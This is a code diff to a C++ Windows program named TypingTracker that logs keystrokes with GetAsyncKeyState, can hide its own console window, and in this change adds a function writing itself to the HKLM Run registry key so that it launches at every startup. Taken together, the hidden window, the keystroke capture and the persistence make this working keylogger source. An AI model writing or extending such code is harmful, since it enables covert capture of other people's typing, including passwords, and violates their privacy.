@@ -597,11 +597,11 @@ int save(const int key)
 		::backspace = 0;
 		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 		{
-			if (GetAsyncKeyState(VK_MENU)) 
+			if (GetAsyncKeyState(VK_MENU))
 			{
 				sLogs += "&#379";
 			}
-			else 
+			else
 			{
 				sLogs += "Z";
 			}
@@ -609,16 +609,15 @@ int save(const int key)
 		}
 		else
 		{
-			if (GetAsyncKeyState(VK_MENU)) 
+			if (GetAsyncKeyState(VK_MENU))
 			{
 				sLogs += "&#380";
 			}
-			else 
+			else
 			{
 				sLogs += "z";
 			}
 		}
-
 	//Decimal key codes
 	case 13:
 		::backspace = 0;
@@ -676,7 +675,7 @@ int save(const int key)
 	return 0;
 }
 
-void stealth(unsigned short int display_mode)
+void stealth(const unsigned short int display_mode)
 {
 	HWND stealth;
 	AllocConsole();
@@ -684,13 +683,37 @@ void stealth(unsigned short int display_mode)
 	ShowWindow(stealth, display_mode); //1 - visible window, 0 - hidden window
 }
 
+void addInAutorun()
+{
+
+	HKEY hKey;
+	char szPath[0x100];
+	GetModuleFileName(NULL, szPath, sizeof(szPath));
+	RegCreateKeyEx(HKEY_LOCAL_MACHINE,
+		"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+		NULL,
+		(LPSTR)"",
+		REG_OPTION_NON_VOLATILE,
+		KEY_SET_VALUE,
+		NULL,
+		&hKey,
+		NULL);
+
+	if (hKey)
+	{
+		RegSetValueEx(hKey, "My program", NULL, REG_SZ, (LPBYTE)szPath, strlen(szPath));
+		RegCloseKey(hKey);
+	}
+}
+
 int main(int argc, char *argv[]) 
 {
-	std::cout << "TypingTracker v0.2.1-alpha3\n" << std::endl;
+	//UI for interactions with application display mode
+	std::cout << "TypingTracker v0.2.3\n" << std::endl;
 
 	unsigned short int display_mode;
 	std::cout << "Display mode 1 - visible window, 0 - hidden window" << std::endl;
-	std::cout << "Select display mode: ";
+	std::cout << "Select display mode and press Enter: ";
 	std::cin >> display_mode;
 
 	if (display_mode == 1 || display_mode == 0)
@@ -699,12 +722,15 @@ int main(int argc, char *argv[])
 	}
 	else
 	{
-		std::cout << "\nERROR!\a\nInvalid display mode value.\n" << std::endl;
+		std::cout << "\nERROR!\a\nInvalid display mode value." << std::endl;
+		std::cout << "Try selected display mode again.\n" << std::endl;
 		exit(1);
 	}
 
 	char buffer[MAX_PATH];
 	::GetModuleFileNameA(NULL, buffer, MAX_PATH);
+
+	addInAutorun();
 
 	char i;
 	while (true) 
